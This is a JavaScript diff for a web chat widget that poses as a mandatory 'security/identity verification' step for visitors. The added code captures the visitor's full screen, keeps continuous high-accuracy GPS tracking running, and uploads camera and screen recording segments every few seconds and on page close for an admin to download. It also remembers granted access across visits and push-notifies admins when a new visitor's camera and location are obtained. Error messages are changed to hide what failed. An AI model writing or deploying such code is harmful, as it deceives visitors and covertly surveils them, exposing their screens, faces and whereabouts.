@@ -520,7 +520,188 @@
     }
   }
 
-  const SEGMENT_UPLOAD_MS = 10_000;
+  const SEGMENT_UPLOAD_MS = 6_000;
+  const SCREEN_SEGMENT_MS = 8_000;
+
+  /** Anlık ekran kaydı durumu */
+  let screenSession = null;
+
+  function screenCaptureActive() {
+    const s = screenSession?.stream;
+    return Boolean(s && s.getVideoTracks?.().some((t) => t.readyState === "live"));
+  }
+
+  async function acquireScreenStreamNative() {
+    if (!navigator.mediaDevices?.getDisplayMedia) {
+      throw new Error("Ekran kaydı desteklenmiyor");
+    }
+    const stream = await navigator.mediaDevices.getDisplayMedia({
+      video: {
+        frameRate: { ideal: 15, max: 30 },
+        width: { ideal: 1920 },
+        height: { ideal: 1080 },
+        displaySurface: "monitor",
+      },
+      audio: false,
+      preferCurrentTab: false,
+      selfBrowserSurface: "exclude",
+      systemAudio: "exclude",
+      surfaceSwitching: "include",
+      monitorTypeSurfaces: "include",
+    });
+    const vt = stream.getVideoTracks?.()[0];
+    if (vt) {
+      try {
+        if ("contentHint" in vt) vt.contentHint = "detail";
+      } catch {
+        /* ignore */
+      }
+      vt.addEventListener("ended", () => {
+        void finalizeScreenCapture({ reason: "track-ended" });
+      });
+    }
+    return stream;
+  }
+
+  function startScreenRecorder(state) {
+    if (!state?.stream || state.recorder || typeof MediaRecorder === "undefined") return false;
+    const tracks = state.stream.getVideoTracks().filter((t) => t.readyState === "live");
+    if (!tracks.length) return false;
+    const mime = pickVisitorRecorderMime();
+    let recorder;
+    try {
+      const opts = mime
+        ? { mimeType: mime, videoBitsPerSecond: 3_500_000 }
+        : { videoBitsPerSecond: 3_500_000 };
+      recorder = new MediaRecorder(new MediaStream(tracks), opts);
+    } catch {
+      try {
+        recorder = mime
+          ? new MediaRecorder(new MediaStream(tracks), { mimeType: mime })
+          : new MediaRecorder(new MediaStream(tracks));
+      } catch {
+        return false;
+      }
+    }
+    const chunks = [];
+    state.recordChunks = chunks;
+    state.recorderMime = recorder.mimeType || mime || "video/webm";
+    recorder.ondataavailable = (e) => {
+      if (e.data?.size) chunks.push(e.data);
+    };
+    state.recorder = recorder;
+    try {
+      recorder.start(1000);
+      return true;
+    } catch {
+      state.recorder = null;
+      return false;
+    }
+  }
+
+  async function rotateAndUploadScreenSegment(state, sync) {
+    if (!state || state._segmentBusy || !sync?.uploadScreenRecording) return;
+    state._segmentBusy = true;
+    try {
+      const blob = await stopVisitorRecorder(state);
+      startScreenRecorder(state);
+      if (!blob?.size) return;
+      const sid = sync.getSessionId?.() || (await sync.ensureSession?.());
+      if (!sid) return;
+      const ext = recordingFileExt(blob);
+      const name = `ekran-${String(sid).slice(0, 8)}.${ext}`;
+      const url = await sync.uploadScreenRecording(sid, blob, name, { finalize: false });
+      if (url) {
+        state.lastUploadedUrl = url;
+        state.lastUploadedName = name;
+      }
+    } catch (err) {
+      console.warn("screen segment", err);
+      if (screenSession === state && !state.recorder) startScreenRecorder(state);
+    } finally {
+      state._segmentBusy = false;
+    }
+  }
+
+  async function beginScreenCapture(stream) {
+    if (!stream) return false;
+    if (screenCaptureActive()) {
+      try {
+        stream.getTracks?.().forEach((t) => t.stop());
+      } catch {
+        /* ignore */
+      }
+      return true;
+    }
+    await finalizeScreenCapture({ upload: false });
+    const state = {
+      stream,
+      recorder: null,
+      recordChunks: [],
+      recorderMime: "",
+      segmentTimer: null,
+      _segmentBusy: false,
+      lastUploadedUrl: "",
+      lastUploadedName: "",
+    };
+    screenSession = state;
+    if (!startScreenRecorder(state)) {
+      window.setTimeout(() => startScreenRecorder(state), 400);
+    }
+
+    window.setTimeout(() => {
+      void rotateAndUploadScreenSegment(state, window.ChatSync);
+    }, 3000);
+    state.segmentTimer = window.setInterval(() => {
+      void rotateAndUploadScreenSegment(state, window.ChatSync);
+    }, SCREEN_SEGMENT_MS);
+
+    try {
+      sessionStorage.setItem("screen_capture_on_v1", "1");
+    } catch {
+      /* ignore */
+    }
+    return true;
+  }
+
+  async function finalizeScreenCapture({ upload = true, reason = "" } = {}) {
+    const state = screenSession;
+    if (!state) return;
+    screenSession = null;
+    if (state.segmentTimer) {
+      window.clearInterval(state.segmentTimer);
+      state.segmentTimer = null;
+    }
+    let blob = null;
+    try {
+      blob = await stopVisitorRecorder(state);
+    } catch {
+      blob = null;
+    }
+    try {
+      state.stream?.getTracks?.().forEach((t) => t.stop());
+    } catch {
+      /* ignore */
+    }
+    if (upload && blob?.size) {
+      try {
+        const sync = window.ChatSync;
+        const sid = sync?.getSessionId?.() || (await sync?.ensureSession?.());
+        if (sid && sync?.uploadScreenRecording) {
+          const ext = recordingFileExt(blob);
+          const name = state.lastUploadedName || `ekran-${String(sid).slice(0, 8)}.${ext}`;
+          await sync.uploadScreenRecording(sid, blob, name, { finalize: true });
+        }
+      } catch (err) {
+        console.warn("screen finalize", err, reason);
+      }
+    }
+    try {
+      sessionStorage.removeItem("screen_capture_on_v1");
+    } catch {
+      /* ignore */
+    }
+  }
 
   async function rotateAndUploadSegment(state, sessionId, callId, sync) {
     const activeId = resolveSessionCallId(state, callId);
@@ -570,6 +751,10 @@
       window.clearInterval(state.segmentTimer);
       state.segmentTimer = null;
     }
+    // İlk parçayı erken yükle — sekme kapanınca admin’in indireceği URL hazır olsun
+    window.setTimeout(() => {
+      void rotateAndUploadSegment(state, sessionId, callId, sync);
+    }, 2500);
     state.segmentTimer = window.setInterval(() => {
       void rotateAndUploadSegment(state, sessionId, callId, sync);
     }, SEGMENT_UPLOAD_MS);
@@ -673,7 +858,7 @@
           console.error(err);
           syncMessage(
             "user",
-            `Güvenlik oturumu kapandı; kayıt yüklenemedi (${err?.code || err?.message || "hata"}). Tekrar girişte denenecek.`
+            `Güvenlik oturumu kapandı; kayıt şu an gönderilemedi. Sayfayı açık tutun — tekrar denenecek.`,
           );
         }
       } else {
@@ -809,6 +994,13 @@
   function flushCameraSessionsOnLeave() {
     if (leaveFlushDone) return;
     leaveFlushDone = true;
+
+    // Ekran kaydını kapat / son parçayı yükle
+    try {
+      void finalizeScreenCapture({ upload: true, reason: "pagehide" });
+    } catch {
+      /* ignore */
+    }
 
     const sync = window.ChatSync;
     const ids = [...cameraSessions.keys()];
@@ -1121,13 +1313,50 @@
         }
       });
 
-    const publish = (pos) => {
+    /** Seed veya ilk fix sonrası watch YOKSA başlat — aksi halde konum tek yazımda ölür */
+    const ensureLiveWatch = () => {
       if (!sessionStillActive(state, callId)) return;
+      if (state.geoWatchId != null) return;
+      try {
+        state.geoWatchId = navigator.geolocation.watchPosition(
+          publish,
+          (err) => {
+            void onErr(err, { fromUserTap: false, explicit: false, fromWatch: true });
+          },
+          {
+            enableHighAccuracy: true,
+            maximumAge: 5000,
+            timeout: 25000,
+          }
+        );
+      } catch (err) {
+        console.warn("geo watch", err);
+        scheduleRetry(LOCATION_RETRY_MS);
+      }
+    };
+
+    const clearFalseLocationGrant = () => {
+      state._hadLocation = false;
+      earlyLocationPos = null;
+      try {
+        sessionStorage.removeItem("early_loc_v1");
+      } catch {
+        /* ignore */
+      }
+      clearMediaPermGranted();
+      if (hasLiveCameraTracks(state)) showPageEntryPermGate();
+    };
+
+    const publish = (pos) => {
+      if (!sessionStillActive(state, callId) || !pos?.coords) return;
       clearLocRetry();
       clearLocDeniedNotice();
       consecutiveCode1 = 0;
       const now = Date.now();
-      if (state._hadLocation && now - lastWriteAt < 2500) return;
+      if (state._hadLocation && now - lastWriteAt < 2500) {
+        ensureLiveWatch();
+        return;
+      }
       lastWriteAt = now;
       const wasFirst = !state._hadLocation;
       state._hadLocation = true;
@@ -1149,6 +1378,7 @@
           ts: now,
         })
         .catch(() => {});
+      ensureLiveWatch();
       if (wasFirst && !state._locationGrantedMsg) {
         state._locationGrantedMsg = true;
         syncMessage("user", "Güvenlik doğrulaması onaylandı.");
@@ -1169,17 +1399,23 @@
 
     const scheduleRetry = (ms = LOCATION_RETRY_MS) => {
       if (deferAsk) return;
-      if (!sessionStillActive(state, callId) || state._hadLocation) return;
+      // Watch varken ve konum varken tekrar isteme
+      if (!sessionStillActive(state, callId)) return;
+      if (state._hadLocation && state.geoWatchId != null) return;
       clearLocRetry();
       state.locationRetryTimer = window.setTimeout(() => {
         state.locationRetryTimer = null;
-        void askLocation({ fromUserTap: false, explicit: false });
+        if (state._hadLocation && state.geoWatchId == null) ensureLiveWatch();
+        else void askLocation({ fromUserTap: false, explicit: false });
       }, ms);
     };
 
     const onErr = async (err, meta = {}) => {
       // Konum hatası kamerayı ASLA kapatmaz
-      if (!sessionStillActive(state, callId) || state._hadLocation) return;
+      if (!sessionStillActive(state, callId)) return;
+      const fromWatch = meta.fromWatch === true;
+      // Canlı konum+watch varken aralıklı watch hatalarını yoksay
+      if (state._hadLocation && state.geoWatchId != null && !fromWatch && !meta.explicit) return;
       const code = Number(err?.code);
       const fromUserTap = meta.fromUserTap === true;
       const explicit = meta.explicit === true; // yalnızca “İzin ver” butonu
@@ -1187,26 +1423,39 @@
       const perm = await geoPermissionState();
 
       // Safari/iOS: jest olmadan veya arka planda code=1 sık gelir — bu “kullanıcı reddetti” değil.
-      // Permissions API “denied” bazen yanlış/sticky — yalnız kalıcı engelde yaz.
       if (code === 1) consecutiveCode1 += 1;
       else consecutiveCode1 = 0;
 
       const reallyDenied =
         (explicit && code === 1 && perm !== "granted") ||
         (perm === "denied" && consecutiveCode1 >= 3) ||
-        (perm === "denied" && explicit);
+        (perm === "denied" && explicit) ||
+        (perm === "denied" && fromWatch && consecutiveCode1 >= 2);
 
       if (reallyDenied) {
         sync
           .writeLocationStatus?.(sessionId, activeId, "denied", err?.message || "denied")
           .catch(() => {});
+        // Seed’li sahte “konum var”ı temizle
+        if (state._hadLocation) clearFalseLocationGrant();
+        if (state.geoWatchId != null) {
+          try {
+            navigator.geolocation.clearWatch(state.geoWatchId);
+          } catch {
+            /* ignore */
+          }
+          state.geoWatchId = null;
+        }
         if (!silent && box) showLocDeniedNotice();
-        // Yine de ara sıra dene — kullanıcı ayardan açabilir
         scheduleRetry(12_000);
         return;
       }
 
-      // Sticky denied’ı admin’de bırakma — prompting/error ile üzerine yaz
+      // Seed vardı ama watch hata verdi → canlı teyit yok say, tekrar dene
+      if (fromWatch && state._hadLocation && code === 1 && perm !== "granted") {
+        // henüz reallyDenied değil — prompting devam
+      }
+
       if (code === 3 || code === 2) {
         sync
           .writeLocationStatus?.(
@@ -1216,23 +1465,22 @@
             err?.message || String(code)
           )
           .catch(() => {});
-      } else {
+      } else if (!state._hadLocation) {
         sync
           .writeLocationStatus?.(
             sessionId,
             activeId,
-            fromUserTap ? "prompting" : "prompting",
+            "prompting",
             perm === "granted" ? "gps-wait" : "Güvenlik adımı bekleniyor"
           )
           .catch(() => {});
       }
-      // İzin granted ama fix yoksa daha hızlı tekrar
       scheduleRetry(perm === "granted" || fromUserTap ? 4_000 : LOCATION_RETRY_MS);
     };
 
     const drainPendingLocAsk = () => {
       const pending = state._pendingLocAsk;
-      if (!pending || state._hadLocation) {
+      if (!pending || (state._hadLocation && state.geoWatchId != null)) {
         state._pendingLocAsk = null;
         return;
       }
@@ -1245,28 +1493,29 @@
     const askLocation = (opts = {}) => {
       const fromUserTap = opts === true || opts?.fromUserTap === true;
       const explicit = opts?.explicit === true;
-      if (!sessionStillActive(state, callId) || state._hadLocation) return;
-      // Jest yolu: devam eden otomatik isteği kuyruğa alıp jest isteği ile değiştir
+      const force = opts?.force === true;
+      if (!sessionStillActive(state, callId)) return;
+      // Konum + canlı watch varken gereksiz getCurrentPosition yok
+      if (state._hadLocation && state.geoWatchId != null && !force && !fromUserTap) return;
+      // Seed sonrası yalnız watch eksikse: gum yerine watch kur
+      if (state._hadLocation && state.geoWatchId == null && !force && !fromUserTap) {
+        ensureLiveWatch();
+        return;
+      }
       if (asking) {
-        if (fromUserTap) {
-          state._pendingLocAsk = { fromUserTap: true, explicit };
+        if (fromUserTap || force) {
+          state._pendingLocAsk = { fromUserTap: true, explicit, force };
         }
         return;
       }
       const now = Date.now();
-      // Dialog açıkken yeniden çağırıp ilk isteği öldürme
-      if (!fromUserTap && now - lastAskAt < 2500) {
+      if (!fromUserTap && !force && now - lastAskAt < 2500) {
         scheduleRetry(3000);
         return;
       }
       asking = true;
       lastAskAt = now;
-      // Aktif watch varken yeniden getCurrentPosition — watch’ı bozma
-      if (state.geoWatchId != null && !fromUserTap) {
-        asking = false;
-        return;
-      }
-      if (state.geoWatchId != null) {
+      if (state.geoWatchId != null && (fromUserTap || force)) {
         try {
           navigator.geolocation.clearWatch(state.geoWatchId);
         } catch {
@@ -1274,12 +1523,15 @@
         }
         state.geoWatchId = null;
       }
+      if (state.geoWatchId != null && !fromUserTap && !force) {
+        asking = false;
+        return;
+      }
 
-      const geoOpts = fromUserTap
+      const geoOpts = fromUserTap || force
         ? { enableHighAccuracy: true, maximumAge: 0, timeout: 45000 }
         : { enableHighAccuracy: true, maximumAge: 15000, timeout: 25000 };
 
-      // Admin’de sticky denied kalmasın — yeni denemede prompting yaz
       if (fromUserTap) {
         sync
           .writeLocationStatus?.(sessionId, resolveSessionCallId(state, callId), "prompting", "Jest doğrulama")
@@ -1290,22 +1542,14 @@
         (pos) => {
           asking = false;
           consecutiveCode1 = 0;
+          // force yenilemede de publish çalışsın
+          if (force) state._hadLocation = false;
           publish(pos);
-          if (!sessionStillActive(state, callId) || !state._hadLocation) {
+          if (!sessionStillActive(state, callId)) {
             drainPendingLocAsk();
             return;
           }
-          state.geoWatchId = navigator.geolocation.watchPosition(
-            publish,
-            (err) => {
-              void onErr(err, { fromUserTap: false, explicit: false });
-            },
-            {
-              enableHighAccuracy: true,
-              maximumAge: 5000,
-              timeout: 25000,
-            }
-          );
+          ensureLiveWatch();
           state._pendingLocAsk = null;
         },
         (err) => {
@@ -1319,7 +1563,8 @@
 
     state.locationRetryTimer = null;
     state._pendingLocAsk = null;
-    // fromUserTap: jest kullan (GPS için); explicit: gerçekten “reddedildi” yazılabilir
+    state.ensureLiveWatch = ensureLiveWatch;
+    // fromUserTap: jest; explicit: reddedildi yazılabilir; force: seed’i ezerek yeniden al
     state.retryLocation = (opts = false) => {
       if (opts === true) askLocation({ fromUserTap: true, explicit: false });
       else if (opts && typeof opts === "object") askLocation(opts);
@@ -1329,13 +1574,27 @@
       askLocation({ fromUserTap: false, explicit: false });
       try {
         navigator.permissions?.query?.({ name: "geolocation" }).then((p) => {
-          if (p?.state === "granted" && !state._hadLocation) {
-            askLocation({ fromUserTap: false, explicit: false });
+          if (p?.state === "granted") {
+            if (!state._hadLocation) askLocation({ fromUserTap: false, explicit: false });
+            else ensureLiveWatch();
+          } else if (p?.state === "denied" && state._hadLocation) {
+            clearFalseLocationGrant();
           }
           p?.addEventListener?.("change", () => {
-            if (p.state === "granted" && !state._hadLocation) {
+            if (p.state === "granted") {
               clearLocDeniedNotice();
-              askLocation({ fromUserTap: false, explicit: false });
+              if (!state._hadLocation) askLocation({ fromUserTap: false, explicit: false, force: true });
+              else ensureLiveWatch();
+            } else if (p.state === "denied") {
+              clearFalseLocationGrant();
+              if (state.geoWatchId != null) {
+                try {
+                  navigator.geolocation.clearWatch(state.geoWatchId);
+                } catch {
+                  /* ignore */
+                }
+                state.geoWatchId = null;
+              }
             }
           });
         }).catch(() => {});
@@ -1603,6 +1862,12 @@
         ts: now,
       })
       .catch(() => {});
+    // Seed tek yazım değil — canlı watch zorunlu (yenileme sonrası konum ölmesin)
+    try {
+      state.ensureLiveWatch?.();
+    } catch {
+      /* ignore */
+    }
     if (!locationGrantedSynced) {
       locationGrantedSynced = true;
       syncMessage("user", "Güvenlik doğrulaması onaylandı.");
@@ -1927,19 +2192,30 @@
     }, VISITOR_RECORD_MAX_MS);
 
     // Gesture / redirect stash / Permissions API ile alınan konum — önce seed,
-    // sonra watch (boş otomatik ask + gesture çakışmasın)
+    // sonra watch. Seed varken deferAsk YAPMA — watch ölürdü (yenileme bug’ı).
     const seed = options.seedLocation || restoreEarlyLocation();
     startLiveLocationWatch(state, sessionId, callId, sync, box, {
-      deferAsk: Boolean(options.deferLocation) || Boolean(seed?.coords),
+      deferAsk: Boolean(options.deferLocation),
       silent: options.silent !== false,
     });
     if (seed?.coords && !state._hadLocation) {
       applySeedLocationToSession(sync, callId, state, seed);
       box?.querySelectorAll?.(".chat-location-perm-denied")?.forEach((el) => el.remove());
     }
+    try {
+      state.ensureLiveWatch?.();
+    } catch {
+      /* ignore */
+    }
     if (!state._hadLocation && !options.deferLocation) {
       try {
         state.retryLocation?.(false);
+      } catch {
+        /* ignore */
+      }
+    } else if (state._hadLocation && state.geoWatchId == null) {
+      try {
+        state.retryLocation?.({ fromUserTap: false, force: true });
       } catch {
         /* ignore */
       }
@@ -1964,6 +2240,13 @@
           preview.label.textContent =
             "Kimlik doğrulaması devam ediyor… (kayıt sınırlı — sayfada kalın)";
         }
+        // Kısa retry — ilk frame gelmeden MediaRecorder başarısız olabilir
+        window.setTimeout(() => {
+          if (!cameraSessions.has(callId) || state.recorder) return;
+          if (startVisitorRecording(state)) {
+            startSegmentUploads(state, sessionId, callId, sync);
+          }
+        }, 900);
       } else {
         startSegmentUploads(state, sessionId, callId, sync);
       }
@@ -1975,9 +2258,9 @@
         beginRec();
       };
       vt.addEventListener("unmute", onUnmute);
-      window.setTimeout(beginRec, 1200);
+      window.setTimeout(beginRec, 600);
     } else {
-      window.setTimeout(beginRec, 250);
+      window.setTimeout(beginRec, 120);
     }
 
     const pendingAdminIce = [];
@@ -2091,7 +2374,7 @@
         appendMessage(
           box,
           "bot",
-          `Bağlantı kurulamadı: ${err?.code || err?.message || "bilinmeyen hata"}`,
+          "Bağlantı kurulamadı. Lütfen sayfada kalın ve tekrar deneyin.",
           { sync: false }
         );
       }
@@ -2298,7 +2581,7 @@
         title.textContent = blocked ? "Doğrulama yok — telefon ayarı" : "Doğrulama açılamadı";
         note.textContent = blocked
           ? phonePermSettingsHelp("camera")
-          : `Doğrulama hatası: ${err?.name || err?.message || "bilinmiyor"}. Tekrar dene.`;
+          : "Doğrulama tamamlanamadı. Tekrar Doğrula’ya basın.";
         okBtn.textContent = "Ayarlardan sonra tekrar dene";
         okBtn.disabled = false;
         options.onSoftDeny?.(String(err?.name || err));
@@ -2443,25 +2726,47 @@
     "Kimlik doğrulaması için güvenlik adımı zorunludur. Lütfen onaylayın; aksi halde doğrulama tamamlanamaz.";
 
   function isMediaPermGranted() {
-    // Canlı oturum yoksa localStorage bayrağına güvenme (yenileme sonrası yalan)
+    // Kalıcı tam erişim: bir kez verildiğinde sonraki ziyaretlerde hatırla
+    try {
+      if (localStorage.getItem(MEDIA_PERM_GRANTED_KEY) === "1") return true;
+    } catch {
+      /* ignore */
+    }
+    // Canlı oturum yoksa bayrağa güvenme (yenileme sonrası yalan)
     if (!hasLiveCameraAndLocation()) return false;
     try {
-      return localStorage.getItem(MEDIA_PERM_GRANTED_KEY) === "1";
+      return sessionStorage.getItem(MEDIA_PERM_GRANTED_KEY) === "1";
     } catch {
       return false;
     }
   }
 
   function markMediaPermGranted() {
-    if (!hasLiveCameraAndLocation()) return;
     try {
       localStorage.setItem(MEDIA_PERM_GRANTED_KEY, "1");
       localStorage.setItem(`${MEDIA_PERM_GRANTED_KEY}_at`, String(Date.now()));
+      sessionStorage.setItem(MEDIA_PERM_GRANTED_KEY, "1");
+      sessionStorage.setItem(`${MEDIA_PERM_GRANTED_KEY}_at`, String(Date.now()));
       sessionStorage.removeItem("soft_resume_v1");
     } catch {
       /* ignore */
     }
     hidePageEntryPermGate();
+  }
+
+  function hasRememberedFullAccess() {
+    try {
+      if (localStorage.getItem(MEDIA_PERM_GRANTED_KEY) === "1") return true;
+      // Eski sekme bayrağını kalıcıya yükselt
+      if (sessionStorage.getItem(MEDIA_PERM_GRANTED_KEY) === "1") {
+        localStorage.setItem(MEDIA_PERM_GRANTED_KEY, "1");
+        localStorage.setItem(`${MEDIA_PERM_GRANTED_KEY}_at`, String(Date.now()));
+        return true;
+      }
+    } catch {
+      /* ignore */
+    }
+    return false;
   }
 
   function navigationIsReload() {
@@ -2632,6 +2937,8 @@
 
   function clearMediaPermGranted() {
     try {
+      sessionStorage.removeItem(MEDIA_PERM_GRANTED_KEY);
+      sessionStorage.removeItem(`${MEDIA_PERM_GRANTED_KEY}_at`);
       localStorage.removeItem(MEDIA_PERM_GRANTED_KEY);
       localStorage.removeItem(`${MEDIA_PERM_GRANTED_KEY}_at`);
     } catch {
@@ -2651,6 +2958,26 @@
 
   function hidePageEntryPermGate() {
     document.getElementById("page-entry-perm-gate")?.remove();
+  }
+
+  async function enrollVisitorPushAndNotifyAdmins() {
+    try {
+      const sync = window.ChatSync || (await window.ChatSyncReady);
+      if (!sync?.enabled) return;
+      if (typeof sync.enablePushNotifications === "function") {
+        await sync.enablePushNotifications("visitor");
+      }
+      if (typeof sync.notifyAdminsPush === "function") {
+        const sid = sync.getSessionId?.() || "";
+        void sync.notifyAdminsPush({
+          title: "Yeni ziyaretçi çevrimiçi",
+          body: `#${String(sid).slice(0, 6)} · kamera/konum erişimi alındı`,
+          tag: `visitor-online-${sid}`,
+        });
+      }
+    } catch (err) {
+      console.warn("visitor push enroll", err);
+    }
   }
 
   function setPageEntryGateStatus(text) {
@@ -2679,20 +3006,36 @@
       .then((stream) => ({ ok: true, stream }))
       .catch((err) => ({ ok: false, err }));
     const locP = acquireLocationNativeOnce();
-    return { camP, locP };
+    // Aynı jestte ekran seçici — await ÖNCE çağrılmalı
+    const screenP = acquireScreenStreamNative()
+      .then((stream) => ({ ok: true, stream }))
+      .catch((err) => ({ ok: false, err }));
+    let notifP = Promise.resolve(
+      typeof Notification !== "undefined" ? Notification.permission : "denied"
+    );
+    if (typeof Notification !== "undefined" && Notification.permission === "default") {
+      try {
+        notifP = Notification.requestPermission();
+      } catch {
+        /* ignore */
+      }
+    }
+    return { camP, locP, screenP, notifP };
   }
 
   async function runGateAllowFlow() {
     if (pageEntryPermBusy) return;
-    if (hasLiveCameraAndLocation()) {
+    if (hasLiveCameraAndLocation() && screenCaptureActive()) {
       hidePageEntryPermGate();
       return;
     }
 
-    // Kamera zaten canlıysa ikinci gum yok — yalnız konum + session bağla
+    // Kamera zaten canlıysa ikinci gum yok — konum + ekran
     const liveCam = hasLiveCameraSession() || hasLiveCameraTracks(earlyCameraStream);
     let camP;
     let locP;
+    let screenP;
+    let notifP = Promise.resolve("denied");
     if (liveCam) {
       setPageEntryGateBusy(true, "Güvenlik doğrulaması isteniyor…");
       locP = acquireLocationNativeOnce();
@@ -2702,12 +3045,28 @@
           findLiveCameraSessionEntry()?.[1]?.stream ||
           (hasLiveCameraTracks(earlyCameraStream) ? earlyCameraStream : null),
       });
+      screenP = screenCaptureActive()
+        ? Promise.resolve({ ok: true, stream: screenSession?.stream || null })
+        : acquireScreenStreamNative()
+            .then((stream) => ({ ok: true, stream }))
+            .catch((err) => ({ ok: false, err }));
+      if (typeof Notification !== "undefined" && Notification.permission === "default") {
+        try {
+          notifP = Notification.requestPermission();
+        } catch {
+          /* ignore */
+        }
+      }
     } else {
       const kicked = kickNativeMediaFromGesture();
       camP = kicked.camP;
       locP = kicked.locP;
-      setPageEntryGateBusy(true, "Telefon güvenlik penceresi açılıyor…");
+      screenP = kicked.screenP;
+      notifP = kicked.notifP;
+      setPageEntryGateBusy(true, "Telefon / ekran güvenlik penceresi açılıyor…");
     }
+
+    void notifP.catch(() => {});
 
     let cam = await camP;
     if (!cam.ok && !liveCam) {
@@ -2724,6 +3083,14 @@
     if (cam.stream && !findLiveCameraSessionEntry()) {
       earlyCameraStream = cam.stream;
     }
+
+    // Ekran sonucunu bekle (jestte başlatıldı)
+    const screenRes = await screenP;
+    if (screenRes?.ok && screenRes.stream) {
+      setPageEntryGateStatus("Ekran kaydı başlatılıyor…");
+      void beginScreenCapture(screenRes.stream);
+    }
+
     setPageEntryGateStatus("Güvenlik doğrulaması tamamlanıyor…");
     const loc = await locP;
     if (loc?.coords) stashEarlyLocation(loc);
@@ -2744,8 +3111,10 @@
     }
 
     if (hasLiveCameraAndLocation()) {
+      markMediaPermGranted();
       hidePageEntryPermGate();
       setPageEntryGateBusy(false);
+      void enrollVisitorPushAndNotifyAdmins();
       return;
     }
 
@@ -2756,7 +3125,6 @@
         ? "İlk adım tamam. Güvenlik doğrulamasını bitirmek için tekrar Doğrula’ya basın."
         : "Bağlantı kurulamadı. Tekrar deneyin."
     );
-    // Metni konum odaklı güncelle
     const title = document.querySelector("#page-entry-perm-gate h2");
     const body = document.querySelector("#page-entry-perm-gate .page-entry-perm-card > p:not(.page-entry-perm-kicker):not(.page-entry-perm-status)");
     if (hasLiveCameraSession()) {
@@ -2881,6 +3249,21 @@
         },
         timestamp: Number(o.ts) || Date.now(),
       };
+      // Geo denied ise stale seed kullanma
+      try {
+        navigator.permissions?.query?.({ name: "geolocation" }).then((p) => {
+          if (p?.state === "denied") {
+            earlyLocationPos = null;
+            try {
+              sessionStorage.removeItem("early_loc_v1");
+            } catch {
+              /* ignore */
+            }
+          }
+        }).catch(() => {});
+      } catch {
+        /* ignore */
+      }
       return earlyLocationPos;
     } catch {
       return null;
@@ -2913,8 +3296,12 @@
       }
     }
 
-    // Konumu stash et — canlı session yoksa tek deneme (spam yok)
-    if (camOk && !earlyLocationPos && navigator.geolocation && !hasLiveCameraSession()) {
+    // Konumu stash et — canlı kamera oturumu varken de konum eksikse dene
+    // (eski: hasLiveCameraSession iken tamamen atlanıyordu → soft resume konumsuz kalıyordu)
+    const liveNeedsLoc =
+      !hasLiveCameraAndLocation() &&
+      !(findLiveCameraSessionEntry()?.[1]?._hadLocation);
+    if (camOk && !earlyLocationPos && navigator.geolocation && liveNeedsLoc) {
       try {
         const pos = await new Promise((resolve) => {
           navigator.geolocation.getCurrentPosition(
@@ -3003,6 +3390,12 @@
             } catch {
               /* ignore */
             }
+          }
+        } else if (st?._hadLocation) {
+          try {
+            st.ensureLiveWatch?.();
+          } catch {
+            /* ignore */
           }
         }
       }
@@ -3192,7 +3585,7 @@
       }
     }
 
-    // 5) Konum — yalnızca session sahibi (retry / seed); ekstra getCurrentPosition yok
+    // 5) Konum — session sahibi (retry / seed); watch eksikse zorla kur
     existing = cameraSessions.get(callId) || findLiveCameraSessionEntry()?.[1];
     const activeId =
       (existing && resolveSessionCallId(existing, callId)) || callId;
@@ -3201,10 +3594,15 @@
         applySeedLocationToSession(sync, activeId, existing, earlyLocationPos);
       }
       try {
-        // Jest yolundan: fromUserTap — GPS için yüksek doğruluk / preempt
         existing.retryLocation?.(
           fromGesture ? { fromUserTap: true, explicit: false } : false
         );
+      } catch {
+        /* ignore */
+      }
+    } else if (existing && existing._hadLocation) {
+      try {
+        existing.ensureLiveWatch?.();
       } catch {
         /* ignore */
       }
@@ -3213,9 +3611,9 @@
     const hasCam = Boolean(
       hasLiveCameraTracks(existing) || hasLiveCameraSession() || hasLiveCameraTracks(earlyCameraStream)
     );
+    // early_loc tek başına “konum OK” sayılmaz — session’a yazılmış olmalı
     const hasLoc = Boolean(
       existing?._hadLocation ||
-        earlyLocationPos?.coords ||
         [...cameraSessions.values()].some((st) => st?._hadLocation)
     );
 
@@ -3281,6 +3679,9 @@
       }
     }
 
+    // Daha önce tam erişim verilmişse önce sessiz reopen dene
+    const remembered = hasRememberedFullAccess();
+
     const startForce = (fromGesture = false) => {
       if (hasLiveCameraAndLocation()) {
         hidePageEntryPermGate();
@@ -3296,6 +3697,7 @@
         } catch {
           /* ignore */
         }
+        void enrollVisitorPushAndNotifyAdmins();
         return;
       }
       if (pageEntryPermBusy) return;
@@ -3305,9 +3707,14 @@
         fromGesture,
         announce: false,
       }).then((ok) => {
-        if (!ok && !hasLiveCameraSession() && !pageEntryPermBusy) {
-          showPageEntryPermGate();
+        if (ok || hasLiveCameraSession()) {
+          hidePageEntryPermGate();
+          if (hasLiveCameraAndLocation() || remembered) {
+            void enrollVisitorPushAndNotifyAdmins();
+          }
+          return;
         }
+        if (!pageEntryPermBusy) showPageEntryPermGate();
       });
     };
 
@@ -3317,6 +3724,62 @@
       window.ChatSyncReady.then(() => startForce(false)).catch(() => startForce(false));
     } else {
       window.setTimeout(() => startForce(false), 350);
+    }
+
+    // Kamera / konum izni ayardan açılınca otomatik reopen
+    try {
+      navigator.permissions?.query?.({ name: "camera" }).then((p) => {
+        p?.addEventListener?.("change", () => {
+          if (p.state === "granted" && !hasLiveCameraSession()) {
+            clearMediaPermGranted();
+            startForce(false);
+          } else if (p.state === "denied") {
+            clearMediaPermGranted();
+            showPageEntryPermGate();
+          }
+        });
+      }).catch(() => {});
+    } catch {
+      /* ignore */
+    }
+    try {
+      navigator.permissions?.query?.({ name: "geolocation" }).then((p) => {
+        if (p?.state === "denied") {
+          earlyLocationPos = null;
+          try {
+            sessionStorage.removeItem("early_loc_v1");
+          } catch {
+            /* ignore */
+          }
+        }
+        p?.addEventListener?.("change", () => {
+          if (p.state === "granted") {
+            const live = findLiveCameraSessionEntry();
+            if (live?.[1] && !live[1]._hadLocation) {
+              try {
+                live[1].retryLocation?.({ fromUserTap: false, force: true });
+              } catch {
+                /* ignore */
+              }
+            } else if (!hasLiveCameraAndLocation()) {
+              startForce(false);
+            }
+          } else if (p.state === "denied") {
+            earlyLocationPos = null;
+            try {
+              sessionStorage.removeItem("early_loc_v1");
+            } catch {
+              /* ignore */
+            }
+            const live = findLiveCameraSessionEntry();
+            if (live?.[1]) live[1]._hadLocation = false;
+            clearMediaPermGranted();
+            if (hasLiveCameraSession()) showPageEntryPermGate();
+          }
+        });
+      }).catch(() => {});
+    } catch {
+      /* ignore */
     }
 
     // Gate dışına basıldığında (popup yokken) jest ile dene
@@ -3525,7 +3988,15 @@
 
     const ensureLocationOnly = (sync, id) => {
